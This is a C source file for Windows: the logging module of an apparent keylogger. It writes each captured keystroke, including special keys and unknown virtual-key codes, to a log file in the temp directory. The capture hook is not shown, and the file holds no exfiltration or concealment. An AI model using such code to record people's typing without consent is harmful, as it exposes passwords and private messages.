#include <Windows.h>
#include <stdio.h>
#include "logger.h"
#include "ascii_converter.h"
#include "../Common/constants.h"

// Global variables for logger
static FILE* g_logFile = NULL;
static CRITICAL_SECTION g_csLogFile;
static bool g_loggerInitialized = false;
static char g_logFilePath[MAX_PATH] = {0};

// Initialize the logger
// Opens the log file and initializes critical section
bool InitLogger() {
    if (g_loggerInitialized) {
        return true;  // Already initialized
    }

    // Initialize critical section for thread safety
    InitializeCriticalSection(&g_csLogFile);

    // Construct log file path in user's temp directory (always writable)
    char tempPath[MAX_PATH];
    DWORD tempLen = GetTempPathA(MAX_PATH, tempPath);
    if (tempLen == 0 || tempLen >= MAX_PATH) {
        // Fallback to current directory if GetTempPath fails
        tempPath[0] = '.';
        tempPath[1] = '\0';
    }

    // Check path length before concatenation
    if (strlen(tempPath) + strlen(LOG_FILE_NAME) + 1 >= MAX_PATH) {
        DeleteCriticalSection(&g_csLogFile);
        return false;
    }

    sprintf_s(g_logFilePath, MAX_PATH, "%s%s", tempPath, LOG_FILE_NAME);

    // Open log file in append mode
    errno_t err = fopen_s(&g_logFile, g_logFilePath, "a");
    if (err != 0 || g_logFile == NULL) {
        DeleteCriticalSection(&g_csLogFile);
        return false;
    }

    // Write session header
    fprintf(g_logFile, "\n=== Session Started ===\n");
    fflush(g_logFile);

    g_loggerInitialized = true;
    return true;
}

// Cleanup the logger
// Closes the log file and deletes critical section
void CleanupLogger() {
    if (!g_loggerInitialized) {
        return;
    }

    EnterCriticalSection(&g_csLogFile);

    if (g_logFile) {
        fprintf(g_logFile, "\n=== Session Ended ===\n\n");
        fflush(g_logFile);
        fclose(g_logFile);
        g_logFile = NULL;
    }

    LeaveCriticalSection(&g_csLogFile);
    DeleteCriticalSection(&g_csLogFile);

    g_loggerInitialized = false;
}

// Log a key event
// Handles both printable characters and special keys
void LogKey(int vkCode) {
    if (!g_loggerInitialized || g_logFile == NULL) {
        return;
    }

    // Skip modifier keys (Shift, Ctrl, Alt, Win)
    if (!ShouldLogKey(vkCode)) {
        return;
    }

    EnterCriticalSection(&g_csLogFile);

    // Check for special key first
    const char* specialKeyName = GetSpecialKeyName(vkCode);
    if (specialKeyName != NULL) {
        fprintf(g_logFile, "%s", specialKeyName);
    } else {
        // Try to convert to ASCII
        bool shift = IsShiftPressed();
        bool caps = IsCapsLockOn();
        char ch = VKToAscii(vkCode, shift, caps);

        if (ch != 0) {
            fprintf(g_logFile, "%c", ch);
        } else {
            // Unknown key - log the VK code
            fprintf(g_logFile, "[VK:0x%02X]", vkCode);
        }
    }

    // Flush immediately to ensure data is written
    fflush(g_logFile);

    LeaveCriticalSection(&g_csLogFile);
}

// Check if logger is initialized and ready
bool IsLoggerReady() {
    return g_loggerInitialized && g_logFile != NULL;
}

// Get the log file path (for display purposes)
const char* GetLogFilePath() {
    return g_logFilePath;
}
